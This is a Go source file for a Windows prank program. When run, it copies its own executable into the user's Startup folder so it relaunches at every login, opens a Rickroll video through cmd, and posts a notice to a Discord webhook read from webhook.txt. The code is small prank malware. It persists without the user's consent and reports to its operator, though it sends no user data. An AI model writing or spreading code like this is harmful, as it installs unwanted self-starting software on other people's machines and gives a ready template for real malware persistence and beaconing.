package main

import (
	"io"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/gtuk/discordwebhook"
)

func main() {
	copyToStartup()
	openLink("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
	var username string = "Rickroll"
	var content string = "Someone got rickrolled :D"
	message := discordwebhook.Message{
		Username: &username,
		Content: &content,
	}
	url, _ := os.ReadFile("webhook.txt")
	discordwebhook.SendMessage(string(url), message)
}
func openLink(link string) {
	exec.Command("cmd","/c","start", link).Start()
	
}
func copyToStartup() {
	exe, _:= os.Executable()
	home, _ := os.UserHomeDir()
	startup := home+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+filepath.Base(exe)
	input, _:= os.Open(exe)
	output, _ := os.Create(startup)
	defer input.Close()
	defer output.Close()
	io.Copy(output, input)
}